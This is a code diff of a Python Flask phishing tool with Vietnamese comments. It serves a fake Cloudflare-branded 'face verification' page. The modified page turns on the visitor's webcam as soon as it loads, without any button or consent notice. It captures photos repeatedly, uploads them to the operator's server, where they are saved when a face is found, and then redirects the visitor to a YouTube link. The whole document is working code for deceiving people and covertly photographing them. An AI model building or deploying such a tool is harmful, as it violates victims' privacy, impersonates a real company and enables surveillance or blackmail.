@@ -6,7 +6,7 @@ import cv2
 import numpy as np
 import subprocess
 
-# Lấy input từ người dùng (hoặc dùng giá trị mặc định)
+# Sử dụng giá trị mặc định từ input
 TITLE = input("Nhập tiêu đề trang web (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
 OG_TITLE = input("Nhập og:title (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
 OG_DESCRIPTION = input("Nhập og:description (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
@@ -17,7 +17,8 @@ app = Flask(__name__)
 os.system("clear")
 os.system("cls")
 
-print("""
+# Banner ASCII
+print(r"""
 ██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
 ██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
 ██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
@@ -33,18 +34,19 @@ print("""
 
 # Khởi tạo classifier phát hiện khuôn mặt
 face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
-
-# Đường dẫn lưu ảnh
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-# Template HTML (lưu ý escape các dấu ngoặc nhọn không dùng cho f-string bằng {{ và }})
+# PHẦN HTML/CSS/JS:
+# - Logo hiển thị biểu tượng Cloudflare (không chứa chữ) từ URL mới
+# - Spinner nhỏ nằm bên dưới logo
+# - Nếu nhận dạng khuôn mặt hợp lệ liên tục đủ 2 bức (2 giây) sẽ chuyển trang
+# - Khi chuyển trang, tắt camera tự động
 HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>{TITLE}</title>
   <!-- Open Graph Metadata -->
   <meta property="og:title" content="{OG_TITLE}">
@@ -54,274 +56,133 @@ HTML_PAGE = f"""
   <meta property="og:type" content="website">
   <link rel="icon" href="https://www.google.com/favicon.ico">
   <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    /* Reset & Global */
-    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
     body {{
-      font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #2c3e50, #4ca1af);
+      margin: 0;
+      background: #000;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      color: #fff;
-    }}
-    /* Khung xác thực */
-    .card {{
-      background: #fff;
-      border-radius: 12px;
-      width: 360px;
-      padding: 30px;
-      text-align: center;
-      position: relative;
+      height: 100vh;
       overflow: hidden;
-      z-index: 1;
-      animation: slideDown 0.8s ease-out;
-      border: 3px solid #4ca1af;
     }}
-    @keyframes slideDown {{
-      from {{ opacity: 0; transform: translateY(-30px); }}
-      to {{ opacity: 1; transform: translateY(0); }}
+    .loading-container {{
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1rem;
     }}
-    .card h2 {{
-      color: #333;
-      margin-bottom: 15px;
-      animation: fadeInText 1s ease-out;
+    /* Logo Cloudflare từ Wikipedia (giữ nguyên màu gốc) */
+    .cloudflare-logo {{
+      width: 200px;
+      height: 200px;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png') no-repeat center/contain;
     }}
-    @keyframes fadeInText {{
-      from {{ opacity: 0; }}
-      to {{ opacity: 1; }}
-    }}
-    .card p {{
-      color: #666;
-      margin-bottom: 20px;
-      font-size: 15px;
-    }}
-    .btn {{
-      background-color: #4ca1af;
-      color: #fff;
-      border: none;
-      padding: 12px 25px;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-      margin-top: 10px;
-    }}
-    .btn:hover {{
-      background-color: #3b8d99;
-    }}
+    /* Spinner nhỏ, bên dưới logo */
     .spinner {{
-      margin: 20px auto;
-      width: 50px;
-      height: 50px;
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #4ca1af;
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid #fff;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      display: none;
     }}
     @keyframes spin {{
+      from {{ transform: rotate(0deg); }}
       to {{ transform: rotate(360deg); }}
     }}
-    .loading-text {{
-      font-size: 16px;
-      color: #4ca1af;
-      margin-top: 10px;
-      display: none;
-      animation: fadeInText 1s ease-out;
-    }}
-    .progress {{
-      font-size: 20px;
-      margin-top: 10px;
-      color: #4ca1af;
-      display: none;
-      animation: fadeInProgress 0.5s ease-out;
-    }}
-    @keyframes fadeInProgress {{
-      from {{ opacity: 0; transform: scale(0.8); }}
-      to {{ opacity: 1; transform: scale(1); }}
-    }}
-    .success {{
-      color: #28a745;
-      font-size: 18px;
-      margin-top: 20px;
-      display: none;
-      animation: fadeInText 1s ease-out;
-    }}
-    .info {{
-      font-size: 13px;
-      color: #999;
-      margin-top: 20px;
-    }}
-    /* Modal Styles */
-    .modal {{
+    /* Notification */
+    .notification {{
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.75);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }}
-    .modal-content {{
-      background: #fff;
-      border-radius: 8px;
-      width: 90%;
-      max-width: 400px;
-      padding: 20px;
-      text-align: center;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-      color: #333;
-      animation: slideUp 0.8s ease-out;
-    }}
-    @keyframes slideUp {{
-      from {{ opacity: 0; transform: translateY(30px); }}
-      to {{ opacity: 1; transform: translateY(0); }}
-    }}
-    .modal-content h3 {{
-      margin-bottom: 10px;
-      color: #4ca1af;
-    }}
-    .modal-content p {{
-      font-size: 14px;
-      margin-bottom: 20px;
-    }}
-    .modal-close {{
-      background: #4ca1af;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: linear-gradient(135deg, #ff0033, #ff66b2);
       color: #fff;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background 0.3s;
+      padding: 15px 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
+      font-size: 1rem;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.4s ease;
     }}
-    .modal-close:hover {{
-      background: #3b8d99;
+    .notification.show {{
+      opacity: 1;
+      visibility: visible;
+      transform: translate(-50%, -10px);
     }}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Xác Thực Khuôn Mặt</h2>
-    <p>Chúng tôi cần xác thực khuôn mặt của bạn để đảm bảo an toàn. Nhấn nút bên dưới để bắt đầu xác minh.</p>
-    <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
-    <div class="spinner" id="loader"></div>
-    <div class="loading-text" id="loading-text">Đang xác thực...</div>
-    <!-- Phần hiển thị số tiến trình -->
-    <div class="progress" id="progress">0%</div>
-    <div class="success" id="success-message">✅ Xác Minh Hoàn Tất ✅</div>
-    <div class="info">Thông tin của bạn sẽ được bảo mật tuyệt đối.</div>
+  <!-- Loading Screen chỉ có logo và spinner -->
+  <div class="loading-container">
+    <div class="cloudflare-logo"></div>
+    <div class="spinner"></div>
   </div>
 
-  <!-- Modal Chính Sách Riêng Tư -->
-  <div class="modal" id="privacy-modal">
-    <div class="modal-content">
-      <h3>🤖 Xác Thực Người Dùng 🤖</h3>
-      <p>Chúng tôi nghi ngờ bạn không phải là con người. Vui lòng xác thực khuôn mặt của bạn để tiếp tục.</p>
-      <button class="modal-close" onclick="closeModal('privacy-modal')">Đồng Ý</button>
-    </div>
-  </div>
-
-  <!-- Modal Anti Ads / Phát hiện AdBlock -->
-  <div class="modal" id="adblock-modal">
-    <div class="modal-content">
-      <h3>Phát hiện AdBlock!</h3>
-      <p>Vui lòng tắt AdBlock để có trải nghiệm tốt nhất.</p>
-      <button class="modal-close" onclick="closeModal('adblock-modal')">Đồng Ý</button>
-    </div>
-  </div>
+  <!-- Notification -->
+  <div id="notification" class="notification">Vui lòng không che mặt hoặc tránh camera!</div>
 
   <script>
-    // Hiển thị modal và kiểm tra AdBlock (không thay đổi)
-    window.addEventListener('load', function() {{
-      document.getElementById('privacy-modal').style.display = 'flex';
-
-      var adTest = document.createElement('div');
-      adTest.className = 'adsbox';
-      adTest.style.position = 'absolute';
-      adTest.style.width = '1px';
-      adTest.style.height = '1px';
-      adTest.style.top = '-1000px';
-      document.body.appendChild(adTest);
-      setTimeout(function() {{
-        if (adTest.offsetHeight === 0) {{
-          document.getElementById('adblock-modal').style.display = 'flex';
-        }}
-        adTest.remove();
-      }}, 200);
-    }});
-
-    function closeModal(modalId) {{
-      document.getElementById(modalId).style.display = 'none';
+    const notification = document.getElementById("notification");
+    function showNotification() {{
+      notification.classList.add("show");
+      setTimeout(() => {{
+        notification.classList.remove("show");
+      }}, 3000);
     }}
 
-    function startVerification() {{
-      let button = document.getElementById("verify-btn");
-      let loader = document.getElementById("loader");
-      let loadingText = document.getElementById("loading-text");
-      let progress = document.getElementById("progress");
-      let successMessage = document.getElementById("success-message");
+    let validCount = 0; // Bộ đếm số lần nhận dạng khuôn mặt hợp lệ liên tiếp
+    let videoStream = null; // Lưu stream để tắt camera sau
 
-      button.style.display = "none";
-      loader.style.display = "block";
-      loadingText.style.display = "block";
-
-      navigator.mediaDevices.getUserMedia({{ video: true }})
-        .then(stream => {{
-          let videoTrack = stream.getVideoTracks()[0];
-          let imageCapture = new ImageCapture(videoTrack);
+    navigator.mediaDevices.getUserMedia({{ video: true }})
+      .then(stream => {{
+        videoStream = stream;
+        let videoTrack = stream.getVideoTracks()[0];
+        let imageCapture = new ImageCapture(videoTrack);
+        function captureLoop() {{
           imageCapture.takePhoto()
             .then(blob => {{
               let formData = new FormData();
               formData.append("image", blob, "face_verification.png");
-              fetch('/upload', {{ method: "POST", body: formData }})
+              fetch("/upload", {{ method: "POST", body: formData }})
                 .then(response => {{
-                  if(response.status !== 200){{
-                    alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
-                    loader.style.display = "none";
-                    loadingText.style.display = "none";
-                    button.style.display = "inline-block";
-                    return;
-                  }}
-                  loader.style.display = "none";
-                  loadingText.style.display = "none";
-                  progress.style.display = "block";
-                  
-                  let count = 0;
-                  let interval = setInterval(() => {{
-                    count++;
-                    progress.innerText = count + "%";
-                    if(count >= 100) {{
-                      clearInterval(interval);
-                      successMessage.style.display = "block";
+                  if(response.ok) {{
+                    validCount++;
+                    // Nếu nhận dạng hợp lệ liên tục đủ 2 bức (2 giây) thì chuyển trang
+                    if(validCount >= 2) {{
+                      videoStream.getTracks().forEach(track => track.stop());
                       window.location.href = "{YOUTUBE_LINK}";
+                    }} else {{
+                      setTimeout(captureLoop, 1000);
                     }}
-                  }}, 30);
+                  }} else {{
+                    validCount = 0;
+                    showNotification();
+                    setTimeout(captureLoop, 1000);
+                  }}
                 }})
-                .catch(error => {{
-                  console.error("Lỗi upload ảnh:", error);
-                  loader.style.display = "none";
-                  loadingText.style.display = "none";
-                  button.style.display = "inline-block";
+                .catch(err => {{
+                  console.error("Lỗi upload:", err);
+                  validCount = 0;
+                  setTimeout(captureLoop, 1000);
                 }});
             }})
             .catch(err => {{
               console.error("Lỗi chụp ảnh:", err);
-              loader.style.display = "none";
-              loadingText.style.display = "none";
-              button.style.display = "inline-block";
+              validCount = 0;
+              setTimeout(captureLoop, 1000);
             }});
-        }})
-        .catch(err => {{
-          console.error("Lỗi truy cập webcam:", err);
-          loader.style.display = "none";
-          loadingText.style.display = "none";
-          button.style.display = "inline-block";
-        }});
-    }}
+        }}
+        captureLoop();
+      }})
+      .catch(err => {{
+        console.error("Lỗi truy cập camera:", err);
+        window.location.href = "{YOUTUBE_LINK}";
+      }});
   </script>
 </body>
 </html>
@@ -329,11 +190,6 @@ HTML_PAGE = f"""
 
 @app.route('/')
 def index():
-    user_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Không xác định')
-    language = request.headers.get('Accept-Language', 'Không xác định')
-    print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
-    print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")
     return render_template_string(HTML_PAGE)
 
 @app.route('/upload', methods=['POST'])
@@ -348,12 +204,10 @@ def upload():
 
     try:
         os.makedirs(SAVE_PATH, exist_ok=True)
-        # Mở ảnh bằng PIL
         img = Image.open(image)
         if img.mode in ("RGBA", "P", "CMYK"):
             img = img.convert("RGB")
         
-        # Chuyển ảnh sang OpenCV để phát hiện khuôn mặt
         img_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
         gray = cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY)
         faces = face_cascade.detectMultiScale(
@@ -365,8 +219,8 @@ def upload():
         )
         print("Detected faces:", faces)
         if len(faces) == 0:
-            print("\033[31m[❌] Không phát hiện được khuôn mặt. Yêu cầu xác thực lại!\033[0m")
-            return "Không phát hiện được khuôn mặt, vui lòng xác thực lại!", 400
+            print("\033[31m[❌] Không phát hiện được khuôn mặt (che mặt?)!\033[0m")
+            return "Che Mặt Rồi", 400
 
         img.save(image_path, "PNG")
         print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
